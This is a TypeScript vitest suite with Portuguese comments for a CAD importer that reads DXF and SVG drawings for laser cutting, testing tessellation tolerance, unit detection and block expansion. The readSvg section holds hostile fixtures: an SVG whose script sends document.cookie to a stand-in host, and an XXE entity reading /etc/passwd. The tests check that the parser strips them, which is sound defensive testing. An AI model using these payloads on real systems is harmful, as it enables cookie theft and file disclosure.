import { describe, expect, it } from 'vitest';
import { readDxf } from '@/lib/cad/dxf-read.js';
import { computeStats, type Pt, type Seg, TAU } from '@/lib/cad/ir.js';
import { readDiagnostics } from '@/lib/cad/read-common.js';
import { sketchToSvg } from '@/lib/cad/render-svg.js';
import { readSvg, sniffFormat } from '@/lib/cad/svg-read.js';
import {
	segCountForArc,
	tessArc,
	tessCircle,
	tessCubic,
	tessEllipse,
	tessSpline,
} from '@/lib/cad/tessellate.js';
import { resolveUnits } from '@/lib/cad/units.js';
import { ToolEngineError } from '@/lib/tool-errors.js';

// ---------------------------------------------------------------------------
// Fixtures de DXF em texto (pares código/valor, como o arquivo real)
// ---------------------------------------------------------------------------

type Par = [number, string | number];

function g(pares: Par[]): string {
	return `${pares.map(([c, v]) => `${c}\n${v}`).join('\n')}\n`;
}

function doc(
	entidades: string,
	opts?: { insunits?: number | null; blocos?: string; tabelas?: string },
): string {
	const header =
		opts?.insunits === undefined || opts.insunits === null
			? ''
			: g([
					[9, '$INSUNITS'],
					[70, opts.insunits],
				]);
	let s = `0\nSECTION\n2\nHEADER\n${header}0\nENDSEC\n`;
	if (opts?.tabelas) s += `0\nSECTION\n2\nTABLES\n${opts.tabelas}0\nENDSEC\n`;
	if (opts?.blocos) s += `0\nSECTION\n2\nBLOCKS\n${opts.blocos}0\nENDSEC\n`;
	s += `0\nSECTION\n2\nENTITIES\n${entidades}0\nENDSEC\n0\nEOF\n`;
	return s;
}

function linha(
	x1: number,
	y1: number,
	x2: number,
	y2: number,
	layer = '0',
): string {
	return g([
		[0, 'LINE'],
		[8, layer],
		[10, x1],
		[20, y1],
		[11, x2],
		[21, y2],
	]);
}

function circulo(cx: number, cy: number, r: number, layer = '0'): string {
	return g([
		[0, 'CIRCLE'],
		[8, layer],
		[10, cx],
		[20, cy],
		[40, r],
	]);
}

function lwpoly(
	pts: Array<[number, number, number?]>,
	fechada: boolean,
	layer = '0',
): string {
	let s = g([
		[0, 'LWPOLYLINE'],
		[8, layer],
		[90, pts.length],
		[70, fechada ? 1 : 0],
	]);
	for (const [x, y, b] of pts) {
		s += g([
			[10, x],
			[20, y],
		]);
		if (b !== undefined && b !== 0) s += g([[42, b]]);
	}
	return s;
}

function bloco(nome: string, corpo: string, base: [number, number] = [0, 0]) {
	return (
		g([
			[0, 'BLOCK'],
			[2, nome],
			[10, base[0]],
			[20, base[1]],
			[30, 0],
		]) +
		corpo +
		g([[0, 'ENDBLK']])
	);
}

function insert(nome: string, x: number, y: number, extra: Par[] = []): string {
	return g([[0, 'INSERT'], [8, '0'], [2, nome], [10, x], [20, y], ...extra]);
}

const RECT_HOLE = doc(
	lwpoly(
		[
			[0, 0],
			[100, 0],
			[100, 60],
			[0, 60],
		],
		true,
	) + circulo(50, 30, 5),
	{ insunits: 4 },
);

// ---------------------------------------------------------------------------
// tessellate — o coração do risco: passo fixo erra por ordem de grandeza
// ---------------------------------------------------------------------------

/** Flecha REAL medida na geometria: R − distância(centro, meio da corda). */
function erroDeCordaReal(pts: Pt[], c: Pt, r: number): number {
	let pior = 0;
	for (let i = 0; i + 1 < pts.length; i++) {
		const mx = (pts[i].x + pts[i + 1].x) / 2;
		const my = (pts[i].y + pts[i + 1].y) / 2;
		const d = r - Math.hypot(mx - c.x, my - c.y);
		if (d > pior) pior = d;
	}
	return pior;
}

describe('tessellate — tolerância de corda', () => {
	it('arco de R=500 fica dentro de 0,05 mm e usa MUITO mais que 16 segmentos', () => {
		const c = { x: 0, y: 0 };
		const pts = tessArc(c, 500, 0, Math.PI / 2, true);
		const segs = pts.length - 1;
		expect(segs).toBe(56);
		expect(segs).toBeGreaterThan(16 * 3);
		const erro = erroDeCordaReal(pts, c, 500);
		expect(erro).toBeLessThanOrEqual(0.05);
		expect(erro).toBeGreaterThan(0.04); // não é exagero: usa a tolerância toda
		// O passo fixo de 16 (o defeito do sampleCubic de lib/vectorize.ts) erraria
		// por mais de um kerf inteiro.
		const fixo16 = tessArcPassoFixo(c, 500, 0, Math.PI / 2, 16);
		expect(erroDeCordaReal(fixo16, c, 500)).toBeGreaterThan(0.5);
	});

	it('furo de R=2 fecha em ~15 segmentos (não 16 nem 720)', () => {
		const pts = tessCircle({ x: 0, y: 0 }, 2);
		expect(pts.length).toBe(15);
		expect(
			erroDeCordaReal([...pts, pts[0]], { x: 0, y: 0 }, 2),
		).toBeLessThanOrEqual(0.05);
	});

	it('nº de segmentos cresce com o raio, não com o comando', () => {
		expect(segCountForArc(2, TAU)).toBe(15);
		expect(segCountForArc(50, TAU)).toBe(71);
		expect(segCountForArc(500, TAU)).toBe(223);
		// piso e teto
		expect(segCountForArc(0.01, TAU)).toBe(4);
		expect(segCountForArc(1e9, TAU)).toBe(720);
	});

	it('elipse usa o raio de curvatura mínimo (ρ_min = b²/a) e fica dentro de ε', () => {
		// 100×10: ρ_min = b²/a = 1 mm. Dimensionar pelo semi-eixo maior daria ~32
		// pontos e erro de milímetros nas pontas.
		const pts = tessEllipse({ x: 0, y: 0 }, 100, 10, 0, 0, TAU);
		expect(pts.length).toBeGreaterThan(95);
		const exatos: Pt[] = [];
		for (let i = 0; i <= 5000; i++) {
			const t = (TAU * i) / 5000;
			exatos.push({ x: 100 * Math.cos(t), y: 10 * Math.sin(t) });
		}
		expect(desvioMaxDaPolilinha(exatos, pts)).toBeLessThanOrEqual(0.05);
		// A mesma elipse com passo fixo de 16 erraria por ordens de grandeza.
		const fixo: Pt[] = [];
		for (let i = 0; i <= 16; i++) {
			const t = (TAU * i) / 16;
			fixo.push({ x: 100 * Math.cos(t), y: 10 * Math.sin(t) });
		}
		// 0,88 mm medido: 17× a tolerância, e 8× o kerf de uma CO2 de 0,1 mm.
		expect(desvioMaxDaPolilinha(exatos, fixo)).toBeGreaterThan(15 * 0.05);
	});

	it('cúbica reta sai com 2 pontos; cúbica curva sai adaptativa', () => {
		const reta = tessCubic(
			{ x: 0, y: 0 },
			{ x: 10, y: 0 },
			{ x: 20, y: 0 },
			{ x: 30, y: 0 },
		);
		expect(reta.length).toBe(2);
		const curva = tessCubic(
			{ x: 0, y: 0 },
			{ x: 0, y: 60 },
			{ x: 90, y: 60 },
			{ x: 90, y: 0 },
		);
		expect(curva.length).toBeGreaterThan(30);
		expect(curva[0]).toEqual({ x: 0, y: 0 });
		expect(curva[curva.length - 1]).toEqual({ x: 90, y: 0 });
	});

	it('spline racional (peso) passa pelo controle do meio quando o peso explode', () => {
		const cps = [
			{ x: 0, y: 0 },
			{ x: 50, y: 100 },
			{ x: 100, y: 0 },
		];
		const leve = tessSpline({ controlPoints: cps, degree: 2 });
		const pesado = tessSpline({
			controlPoints: cps,
			degree: 2,
			weights: [1, 1000, 1],
		});
		const topo = (pts: Pt[]) => Math.max(...pts.map((p) => p.y));
		expect(topo(leve)).toBeCloseTo(50, 0); // Bézier quadrática: metade da altura
		expect(topo(pesado)).toBeGreaterThan(95); // peso 1000 cola no controle
	});
});

/** Distância de `p` ao SEGMENTO a→b. */
function distSeg(p: Pt, a: Pt, b: Pt): number {
	const dx = b.x - a.x;
	const dy = b.y - a.y;
	const l2 = dx * dx + dy * dy;
	if (l2 < 1e-18) return Math.hypot(p.x - a.x, p.y - a.y);
	let t = ((p.x - a.x) * dx + (p.y - a.y) * dy) / l2;
	t = Math.max(0, Math.min(1, t));
	return Math.hypot(p.x - (a.x + t * dx), p.y - (a.y + t * dy));
}

/** Maior distância da curva EXATA à polilinha achatada (erro de corda medido). */
function desvioMaxDaPolilinha(exatos: Pt[], pts: Pt[]): number {
	let pior = 0;
	for (const e of exatos) {
		let melhor = Number.POSITIVE_INFINITY;
		for (let i = 0; i + 1 < pts.length; i++) {
			const d = distSeg(e, pts[i], pts[i + 1]);
			if (d < melhor) melhor = d;
		}
		if (melhor > pior) pior = melhor;
	}
	return pior;
}

function tessArcPassoFixo(
	c: Pt,
	r: number,
	a0: number,
	a1: number,
	n: number,
): Pt[] {
	const out: Pt[] = [];
	for (let i = 0; i <= n; i++) {
		const a = a0 + ((a1 - a0) * i) / n;
		out.push({ x: c.x + r * Math.cos(a), y: c.y + r * Math.sin(a) });
	}
	return out;
}

// ---------------------------------------------------------------------------
// units
// ---------------------------------------------------------------------------

describe('units — erro de unidade é erro de preço por 25×', () => {
	it('respeita $INSUNITS', () => {
		expect(resolveUnits({ insunits: 4 })).toMatchObject({
			factorToMm: 1,
			source: 'insunits',
			detected: 'mm',
		});
		expect(resolveUnits({ insunits: 1 })).toMatchObject({
			factorToMm: 25.4,
			detected: 'in',
		});
		expect(resolveUnits({ insunits: 2 }).factorToMm).toBeCloseTo(304.8, 6);
		expect(resolveUnits({ insunits: 5 }).factorToMm).toBe(10);
		expect(resolveUnits({ insunits: 6 }).factorToMm).toBe(1000);
	});

	it('hint humano manda no arquivo', () => {
		const r = resolveUnits({ insunits: 4, hint: 'in' });
		expect(r).toMatchObject({
			factorToMm: 25.4,
			source: 'hint',
			detected: 'in',
		});
		expect(r.warning).toBeUndefined();
	});

	it('sem $INSUNITS: desenho pequeno é polegada, médio é mm, grande avisa', () => {
		const peq = resolveUnits({ insunits: 0, bbox: { w: 20, h: 8 } });
		expect(peq).toMatchObject({
			factorToMm: 25.4,
			detected: 'in',
			source: 'heuristica',
		});
		expect(peq.warning).toContain('POLEGADA');

		const med = resolveUnits({ insunits: null, bbox: { w: 300, h: 120 } });
		expect(med).toMatchObject({ factorToMm: 1, detected: 'mm' });
		expect(med.warning).toContain('$INSUNITS');

		const gra = resolveUnits({ bbox: { w: 12000, h: 500 } });
		expect(gra.factorToMm).toBe(1);
		expect(gra.warning).toContain('ambígua');
	});

	it('código de unidade exótico cai na heurística, nunca aplica fator absurdo', () => {
		const r = resolveUnits({ insunits: 9, bbox: { w: 300, h: 100 } });
		expect(r.factorToMm).toBe(1);
		expect(r.warning).toContain('$INSUNITS=9');
	});
});

// ---------------------------------------------------------------------------
// readDxf
// ---------------------------------------------------------------------------

describe('readDxf', () => {
	it('retângulo com furo: bbox, comprimento e perfurações determinísticos', () => {
		const s = readDxf(RECT_HOLE);
		expect(s.units).toBe('mm');
		expect(s.parts).toHaveLength(1);
		expect(s.parts[0].bbox.w).toBeCloseTo(100, 9);
		expect(s.parts[0].bbox.h).toBeCloseTo(60, 9);
		// 2·(100+60) + 2π·5
		expect(s.meta.stats.cutLengthMm).toBeCloseTo(320 + TAU * 5, 6);
		expect(s.meta.stats.pierces).toBe(2);
		const d = readDiagnostics(s);
		expect(d?.formato).toBe('dxf');
		expect(d?.unidade).toMatchObject({ source: 'insunits', detected: 'mm' });
		expect(d?.lidas).toMatchObject({ LWPOLYLINE: 1, CIRCLE: 1 });
		// geometria normalizada para a origem (o nesting depende disso)
		const pts = (s.parts[0].paths[0].seg as Extract<Seg, { k: 'poly' }>).pts;
		expect(Math.min(...pts.map((p) => p.x))).toBeCloseTo(0, 9);
	});

	it('círculos: cada furo é uma perfuração e o círculo continua círculo na IR', () => {
		const s = readDxf(
			doc(circulo(0, 0, 10) + circulo(40, 0, 3), { insunits: 4 }),
		);
		expect(s.parts[0].paths.every((p) => p.seg.k === 'circle')).toBe(true);
		expect(s.meta.stats.cutLengthMm).toBeCloseTo(TAU * 10 + TAU * 3, 9);
		expect(s.meta.stats.pierces).toBe(2);
	});

	it('arco: preservado como arco (comprimento exato, sem erro de achatamento)', () => {
		const s = readDxf(
			doc(
				g([
					[0, 'ARC'],
					[8, '0'],
					[10, 0],
					[20, 0],
					[40, 500],
					[50, 0],
					[51, 90],
				]),
				{ insunits: 4 },
			),
		);
		expect(s.parts[0].paths[0].seg.k).toBe('arc');
		expect(s.meta.stats.cutLengthMm).toBeCloseTo((TAU * 500) / 4, 6);
	});

	it('LWPOLYLINE com bulge: arco de canto preservado, não facetado', () => {
		// Retângulo 40×20 com cantos R=5 (bulge de 90° = tan(22,5°))
		const b = Math.tan(Math.PI / 8);
		const s = readDxf(
			doc(
				lwpoly(
					[
						[5, 0],
						[35, 0, b],
						[40, 5],
						[40, 15, b],
						[35, 20],
						[5, 20, b],
						[0, 15],
						[0, 5, b],
					],
					true,
				),
				{ insunits: 4 },
			),
		);
		const seg = s.parts[0].paths[0].seg as Extract<Seg, { k: 'poly' }>;
		expect(seg.k).toBe('poly');
		expect(seg.bulges).toBeDefined();
		expect(seg.pts).toHaveLength(8);
		// 2·(30+10) retos + 4 quartos de círculo R=5
		expect(s.meta.stats.cutLengthMm).toBeCloseTo(80 + TAU * 5, 6);
		expect(s.parts[0].bbox.w).toBeCloseTo(40, 9);
		expect(s.parts[0].bbox.h).toBeCloseTo(20, 9);
	});

	it('SPLINE: achatada com tolerância, comprimento entre a corda e o polígono de controle', () => {
		const s = readDxf(
			doc(
				g([
					[0, 'SPLINE'],
					[8, '0'],
					[70, 8],
					[71, 3],
					[72, 8],
					[73, 4],
					[40, 0],
					[40, 0],
					[40, 0],
					[40, 0],
					[40, 1],
					[40, 1],
					[40, 1],
					[40, 1],
					[10, 0],
					[20, 0],
					[10, 0],
					[20, 60],
					[10, 90],
					[20, 60],
					[10, 90],
					[20, 0],
				]),
				{ insunits: 4 },
			),
		);
		const seg = s.parts[0].paths[0].seg as Extract<Seg, { k: 'poly' }>;
		expect(seg.k).toBe('poly');
		expect(seg.pts.length).toBeGreaterThan(20);
		const corda = 90;
		const controle = 60 + 90 + 60;
		expect(s.meta.stats.cutLengthMm).toBeGreaterThan(corda);
		expect(s.meta.stats.cutLengthMm).toBeLessThan(controle);
		expect(s.parts[0].bbox.w).toBeCloseTo(90, 6);
	});

	it('INSERT aninhado: expande com a matriz composta', () => {
		const blocos =
			bloco('FURO', circulo(0, 0, 4)) +
			bloco('PAR', insert('FURO', 0, 0) + insert('FURO', 20, 0));
		const s = readDxf(doc(insert('PAR', 100, 100), { insunits: 4, blocos }));
		expect(s.parts[0].paths).toHaveLength(2);
		expect(s.meta.stats.cutLengthMm).toBeCloseTo(2 * TAU * 4, 9);
		// dois furos separados por 20 mm: bbox 28 × 8
		expect(s.parts[0].bbox.w).toBeCloseTo(28, 9);
		expect(s.parts[0].bbox.h).toBeCloseTo(8, 9);
		const d = readDiagnostics(s);
		expect(d?.blocosExpandidos).toBe(3);
	});

	it('bloco A→B→A: ciclo detectado e reportado, NÃO travado', () => {
		const blocos =
			bloco('A', circulo(0, 0, 5) + insert('B', 0, 0)) +
			bloco('B', linha(0, 0, 10, 0) + insert('A', 0, 0));
		const s = readDxf(doc(insert('A', 0, 0), { insunits: 4, blocos }));
		const d = readDiagnostics(s);
		expect(d?.blocosCiclicos).toEqual(['A']);
		// a geometria de A e de B entrou uma vez cada
		expect(s.parts[0].paths).toHaveLength(2);
		expect(s.meta.warnings.join(' ')).toContain('circular');
	});

	it('arranjo retangular de INSERT (nesting) multiplica a geometria', () => {
		const blocos = bloco('P', circulo(0, 0, 2));
		const s = readDxf(
			doc(
				insert('P', 0, 0, [
					[70, 3],
					[71, 2],
					[44, 10],
					[45, 10],
				]),
				{ insunits: 4, blocos },
			),
		);
		expect(s.parts[0].paths).toHaveLength(6);
		expect(readDiagnostics(s)?.blocosExpandidos).toBe(6);
		expect(s.parts[0].bbox.w).toBeCloseTo(24, 9); // 2 colunas de 10 + Ø4
	});

	it('escala não-uniforme transforma CIRCLE em elipse tesselada', () => {
		const blocos = bloco('P', circulo(0, 0, 10));
		const s = readDxf(
			doc(
				insert('P', 0, 0, [
					[41, 2],
					[42, 1],
				]),
				{ insunits: 4, blocos },
			),
		);
		const seg = s.parts[0].paths[0].seg;
		expect(seg.k).toBe('poly');
		expect(s.parts[0].bbox.w).toBeCloseTo(40, 1);
		expect(s.parts[0].bbox.h).toBeCloseTo(20, 1);
		// Perímetro de elipse 20×10 (Ramanujan) ≈ 96,88 mm
		const a = 20;
		const b = 10;
		const ram = Math.PI * (3 * (a + b) - Math.sqrt((3 * a + b) * (a + 3 * b)));
		expect(s.meta.stats.cutLengthMm).toBeCloseTo(ram, 0);
	});

	it('escala negativa espelha sem mudar o comprimento de corte', () => {
		const b = Math.tan(Math.PI / 8);
		const corpo = lwpoly(
			[
				[0, 0],
				[30, 0, b],
				[35, 5],
				[0, 5],
			],
			true,
		);
		const blocos = bloco('P', corpo);
		const reto = readDxf(doc(insert('P', 0, 0), { insunits: 4, blocos }));
		const espelho = readDxf(
			doc(insert('P', 0, 0, [[41, -1]]), { insunits: 4, blocos }),
		);
		expect(espelho.meta.stats.cutLengthMm).toBeCloseTo(
			reto.meta.stats.cutLengthMm,
			9,
		);
		const seg = espelho.parts[0].paths[0].seg as Extract<Seg, { k: 'poly' }>;
		// bulge trocou de sinal: o arco mudou de lado da corda
		expect(seg.bulges?.some((v) => v < 0)).toBe(true);
	});

	it('bulge dentro de bloco com escala não-uniforme é achatado (não some)', () => {
		const b = Math.tan(Math.PI / 8);
		const blocos = bloco(
			'P',
			lwpoly(
				[
					[0, 0],
					[20, 0, b],
					[30, 10],
					[0, 10],
				],
				true,
			),
		);
		const s = readDxf(
			doc(
				insert('P', 0, 0, [
					[41, 2],
					[42, 1],
				]),
				{ insunits: 4, blocos },
			),
		);
		const seg = s.parts[0].paths[0].seg as Extract<Seg, { k: 'poly' }>;
		expect(seg.k).toBe('poly');
		expect(seg.bulges).toBeUndefined(); // virou reta a reta: o arco não é mais circular
		expect(seg.pts.length).toBeGreaterThan(10);
		expect(s.parts[0].bbox.w).toBeCloseTo(60, 1);
		expect(s.parts[0].bbox.h).toBeCloseTo(10, 1);
	});

	it('DXF com CRLF e espaços (exportador do Windows) é lido igual', () => {
		const crlf = RECT_HOLE.split('\n')
			.map((l) => `  ${l}  `)
			.join('\r\n');
		const s = readDxf(crlf);
		expect(s.parts[0].bbox.w).toBeCloseTo(100, 9);
		expect(s.meta.stats.cutLengthMm).toBeCloseTo(320 + TAU * 5, 6);
	});

	it('arquivo em polegadas vira mm de verdade', () => {
		const s = readDxf(
			doc(
				lwpoly(
					[
						[0, 0],
						[4, 0],
						[4, 2],
						[0, 2],
					],
					true,
				),
				{ insunits: 1 },
			),
		);
		expect(s.parts[0].bbox.w).toBeCloseTo(101.6, 6);
		expect(s.parts[0].bbox.h).toBeCloseTo(50.8, 6);
		expect(s.meta.stats.cutLengthMm).toBeCloseTo(2 * (101.6 + 50.8), 6);
		expect(readDiagnostics(s)?.bboxOriginal.w).toBeCloseTo(4, 9);
	});

	it('sem $INSUNITS: peça de 20 unidades é lida como polegada, COM aviso', () => {
		const s = readDxf(
			doc(
				lwpoly(
					[
						[0, 0],
						[20, 0],
						[20, 8],
						[0, 8],
					],
					true,
				),
			),
		);
		expect(s.parts[0].bbox.w).toBeCloseTo(508, 6);
		const d = readDiagnostics(s);
		expect(d?.unidade).toMatchObject({ source: 'heuristica', detected: 'in' });
		expect(s.meta.warnings[0]).toContain('POLEGADA');
	});

	it('sem $INSUNITS: peça de 300 unidades fica em mm, mas ainda avisa', () => {
		const s = readDxf(
			doc(
				lwpoly(
					[
						[0, 0],
						[300, 0],
						[300, 120],
						[0, 120],
					],
					true,
				),
			),
		);
		expect(s.parts[0].bbox.w).toBeCloseTo(300, 9);
		expect(readDiagnostics(s)?.unidade.detected).toBe('mm');
		expect(s.meta.warnings.join(' ')).toContain('Confirme');
	});

	it('hint do usuário vence a heurística (o seletor da UI manda)', () => {
		const s = readDxf(
			doc(
				lwpoly(
					[
						[0, 0],
						[20, 0],
						[20, 8],
						[0, 8],
					],
					true,
				),
			),
			{
				unitHint: 'mm',
			},
		);
		expect(s.parts[0].bbox.w).toBeCloseTo(20, 9);
		expect(readDiagnostics(s)?.unidade.source).toBe('hint');
	});

	it('ε continua valendo 0,05 mm num arquivo em polegada', () => {
		// círculo de R=1 in (25,4 mm) dentro de bloco com escala não-uniforme para
		// forçar tesselação; nº de segmentos tem de ser o de R=25,4 mm, não o de R=1.
		const blocos = bloco('P', circulo(0, 0, 1));
		const s = readDxf(
			doc(
				insert('P', 0, 0, [
					[41, 1.0001],
					[42, 1],
				]),
				{ insunits: 1, blocos },
			),
		);
		const seg = s.parts[0].paths[0].seg as Extract<Seg, { k: 'poly' }>;
		expect(seg.pts.length).toBe(segCountForArc(25.4, TAU, 0.05));
		expect(seg.pts.length).toBeGreaterThan(segCountForArc(1, TAU, 0.05));
	});

	it('layer de cota/texto não entra no corte mas é reportada', () => {
		const s = readDxf(
			doc(
				lwpoly(
					[
						[0, 0],
						[100, 0],
						[100, 60],
						[0, 60],
					],
					true,
				) +
					linha(0, 0, 100, 0, 'COTAS') +
					linha(0, 70, 100, 70, 'Defpoints'),
				{ insunits: 4 },
			),
		);
		expect(s.meta.stats.cutLengthMm).toBeCloseTo(320, 9);
		const d = readDiagnostics(s);
		expect(d?.layersAuxiliares).toEqual(['COTAS', 'Defpoints']);
		expect(d?.layersUsadas).toEqual(['0']);
		expect(s.parts[0].paths).toHaveLength(3); // aparecem no desenho, sem custo
	});

	it('layer com nome de gravação vira passe de gravação, não de corte', () => {
		const s = readDxf(
			doc(
				lwpoly(
					[
						[0, 0],
						[100, 0],
						[100, 60],
						[0, 60],
					],
					true,
				) + linha(10, 10, 90, 10, 'GRAVACAO'),
				{ insunits: 4 },
			),
		);
		expect(s.meta.stats.cutLengthMm).toBeCloseTo(320, 9);
		expect(s.meta.stats.engraveLengthMm).toBeCloseTo(80, 9);
	});

	it('TEXT/MTEXT não é vetorizado: vira diagnóstico, nunca comprimento', () => {
		const s = readDxf(
			doc(
				circulo(0, 0, 10) +
					g([
						[0, 'TEXT'],
						[8, '0'],
						[10, 0],
						[20, 20],
						[40, 5],
						[1, 'PROFISSAO LASER'],
					]),
				{ insunits: 4 },
			),
		);
		expect(s.meta.stats.cutLengthMm).toBeCloseTo(TAU * 10, 9);
		expect(readDiagnostics(s)?.textos).toBe(1);
		expect(s.meta.warnings.join(' ')).toContain('não vetorizado');
	});

	it('HATCH, SOLID, DIMENSION e POINT são ignorados E contados', () => {
		const s = readDxf(
			doc(
				circulo(0, 0, 10) +
					g([
						[0, 'HATCH'],
						[8, '0'],
						[10, 0],
						[20, 0],
					]) +
					g([
						[0, 'SOLID'],
						[8, '0'],
						[10, 0],
						[20, 0],
					]) +
					g([
						[0, 'POINT'],
						[8, '0'],
						[10, 5],
						[20, 5],
					]),
				{ insunits: 4 },
			),
		);
		const d = readDiagnostics(s);
		expect(d?.ignoradas.HATCH).toBe(1);
		expect(d?.ignoradas.SOLID).toBe(1);
		expect(d?.ignoradas.POINT).toBe(1);
		expect(s.meta.stats.cutLengthMm).toBeCloseTo(TAU * 10, 9);
	});

	it('entidade invisível (grupo 60) e layer congelada saem fora', () => {
		const tabelas =
			g([
				[0, 'TABLE'],
				[2, 'LAYER'],
				[70, 1],
				[0, 'LAYER'],
				[2, 'OCULTA'],
				[70, 1],
				[62, 7],
				[0, 'ENDTAB'],
			]) || '';
		const s = readDxf(
			doc(
				circulo(0, 0, 10) +
					g([
						[0, 'CIRCLE'],
						[8, '0'],
						[60, 1],
						[10, 100],
						[20, 0],
						[40, 3],
					]) +
					circulo(200, 0, 7, 'OCULTA'),
				{ insunits: 4, tabelas },
			),
		);
		expect(s.parts[0].paths).toHaveLength(1);
		expect(s.meta.stats.cutLengthMm).toBeCloseTo(TAU * 10, 9);
		const d = readDiagnostics(s);
		expect(Object.keys(d?.ignoradas ?? {}).join(' ')).toContain('invisível');
	});

	it('estouro de entidades expandidas responde 413, não trava', () => {
		const blocos = bloco('P', circulo(0, 0, 1));
		const dxf = doc(
			insert('P', 0, 0, [
				[70, 100],
				[71, 100],
				[44, 5],
				[45, 5],
			]),
			{ insunits: 4, blocos },
		);
		try {
			readDxf(dxf, { maxEntities: 500 });
			throw new Error('deveria ter estourado');
		} catch (e) {
			expect(e).toBeInstanceOf(ToolEngineError);
			expect((e as ToolEngineError).status).toBe(413);
		}
	});

	it('arquivo sem geometria útil recusa com 400 explicativo', () => {
		expect(() => readDxf(doc('', { insunits: 4 }))).toThrow(ToolEngineError);
		expect(() => readDxf(doc('', { insunits: 4 }))).toThrow(
			/Nenhuma geometria/,
		);
		expect(() => readDxf('')).toThrow(/vazio/);
	});

	it('a IR lida alimenta computeStats igual à dos geradores', () => {
		const s = readDxf(RECT_HOLE);
		expect(computeStats(s.parts)).toEqual(s.meta.stats);
	});

	it('a prévia sai de graça pelo exportador SVG existente (mesma IR)', () => {
		const svg = sketchToSvg(readDxf(RECT_HOLE));
		expect(svg).toContain('<svg');
		expect(svg).toContain('mm"'); // sai em milímetro de verdade
		expect(svg).toContain('circle');
		// e o SVG lido de volta reproduz a mesma medida (ida e volta pela IR)
		const volta = readSvg(svg);
		expect(volta.parts[0].bbox.w).toBeCloseTo(100, 3);
		expect(volta.parts[0].bbox.h).toBeCloseTo(60, 3);
		expect(volta.meta.stats.cutLengthMm).toBeCloseTo(320 + TAU * 5, 2);
	});
});

// ---------------------------------------------------------------------------
// readSvg
// ---------------------------------------------------------------------------

const SVG_MM = `<?xml version="1.0"?>
<svg xmlns="http://www.w3.org/2000/svg" width="120mm" height="80mm" viewBox="0 0 120 80">
  <g inkscape:label="CORTE">
    <rect x="10" y="10" width="100" height="60"/>
    <circle cx="60" cy="40" r="5"/>
  </g>
</svg>`;

const SVG_MALICIOSO = `<svg xmlns="http://www.w3.org/2000/svg" width="50mm" height="50mm" viewBox="0 0 50 50" onload="alert(1)">
  <script type="text/javascript">fetch('http://mau.example/'+document.cookie)</script>
  <foreignObject width="10" height="10"><body>oi</body></foreignObject>
  <image href="http://mau.example/x.png" width="10" height="10"/>
  <use xlink:href="http://mau.example/x.svg#a"/>
  <rect x="0" y="0" width="50" height="50"/>
</svg>`;

describe('readSvg', () => {
	it('SVG em mm com viewBox: 1 unidade = 1 mm', () => {
		const s = readSvg(SVG_MM);
		expect(s.parts[0].bbox.w).toBeCloseTo(100, 6);
		expect(s.parts[0].bbox.h).toBeCloseTo(60, 6);
		expect(s.meta.stats.cutLengthMm).toBeCloseTo(320 + TAU * 5, 6);
		const d = readDiagnostics(s);
		expect(d?.unidade).toMatchObject({
			source: 'svg',
			detected: 'mm',
			factorToMm: 1,
		});
		expect(d?.unidade.warning).toBeUndefined();
		expect(d?.lidas).toMatchObject({ rect: 1, circle: 1 });
	});

	it('script, foreignObject, image e use são DESCARTADOS e contados', () => {
		const s = readSvg(SVG_MALICIOSO);
		expect(s.parts[0].paths).toHaveLength(1);
		expect(s.meta.stats.cutLengthMm).toBeCloseTo(200, 6);
		const d = readDiagnostics(s);
		expect(d?.ignoradas['<script>']).toBe(1);
		expect(d?.ignoradas['<foreignObject>']).toBeGreaterThanOrEqual(1);
		expect(d?.ignoradas['<image>']).toBe(1);
		expect(d?.ignoradas['<use>']).toBe(1);
		expect(d?.ignoradas['atributo on*']).toBe(1);
		// nada do conteúdo hostil sobrevive na IR
		expect(JSON.stringify(s.parts[0].paths)).not.toContain('mau.example');
	});

	it('DOCTYPE com <!ENTITY> (XXE) é jogado fora antes de qualquer varredura', () => {
		const xxe = `<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<svg xmlns="http://www.w3.org/2000/svg" width="10mm" height="10mm" viewBox="0 0 10 10"><rect width="10" height="10"/></svg>`;
		const s = readSvg(xxe);
		expect(readDiagnostics(s)?.ignoradas['DOCTYPE com <!ENTITY> (XXE)']).toBe(
			1,
		);
		expect(s.meta.stats.cutLengthMm).toBeCloseTo(40, 6);
	});

	it('sem unidade física: assume 96 dpi e AVISA', () => {
		const s = readSvg(
			'<svg xmlns="http://www.w3.org/2000/svg" width="96" height="96"><rect x="0" y="0" width="96" height="96"/></svg>',
		);
		expect(s.parts[0].bbox.w).toBeCloseTo(25.4, 6);
		const d = readDiagnostics(s);
		expect(d?.unidade.detected).toBe('px');
		expect(d?.unidade.warning).toContain('96 dpi');
	});

	it('width em mm com viewBox menor: escala mm/unidade aplicada', () => {
		const s = readSvg(
			'<svg xmlns="http://www.w3.org/2000/svg" width="200mm" height="100mm" viewBox="0 0 100 50"><rect x="0" y="0" width="100" height="50"/></svg>',
		);
		expect(readDiagnostics(s)?.unidade.factorToMm).toBeCloseTo(2, 9);
		expect(s.parts[0].bbox.w).toBeCloseTo(200, 6);
	});

	it('path com arco (A) é normalizado por svgpath e achatado dentro da tolerância', () => {
		// semicírculo de raio 20 mm
		const s = readSvg(
			'<svg xmlns="http://www.w3.org/2000/svg" width="40mm" height="20mm" viewBox="0 0 40 20"><path d="M0 20 A20 20 0 0 1 40 20"/></svg>',
		);
		const seg = s.parts[0].paths[0].seg as Extract<Seg, { k: 'poly' }>;
		expect(seg.k).toBe('poly');
		expect(seg.pts.length).toBeGreaterThan(10);
		expect(s.meta.stats.cutLengthMm).toBeCloseTo(Math.PI * 20, 1);
	});

	it('path com subcaminhos: contorno e furo saem separados (2 perfurações)', () => {
		const s = readSvg(
			'<svg xmlns="http://www.w3.org/2000/svg" width="100mm" height="100mm" viewBox="0 0 100 100"><path d="M0 0 H100 V100 H0 Z M40 40 H60 V60 H40 Z"/></svg>',
		);
		expect(s.parts[0].paths).toHaveLength(2);
		expect(s.meta.stats.pierces).toBe(2);
		expect(s.meta.stats.cutLengthMm).toBeCloseTo(400 + 80, 6);
	});

	it('transform de grupo entra na geometria', () => {
		const s = readSvg(
			'<svg xmlns="http://www.w3.org/2000/svg" width="100mm" height="100mm" viewBox="0 0 100 100"><g transform="translate(10,10) scale(2)"><rect x="0" y="0" width="20" height="10"/></g></svg>',
		);
		expect(s.parts[0].bbox.w).toBeCloseTo(40, 6);
		expect(s.parts[0].bbox.h).toBeCloseTo(20, 6);
	});

	it('inversão de Y não muda comprimento nem tamanho', () => {
		const s = readSvg(
			'<svg xmlns="http://www.w3.org/2000/svg" width="60mm" height="40mm" viewBox="0 0 60 40"><polygon points="0,0 60,0 60,40"/></svg>',
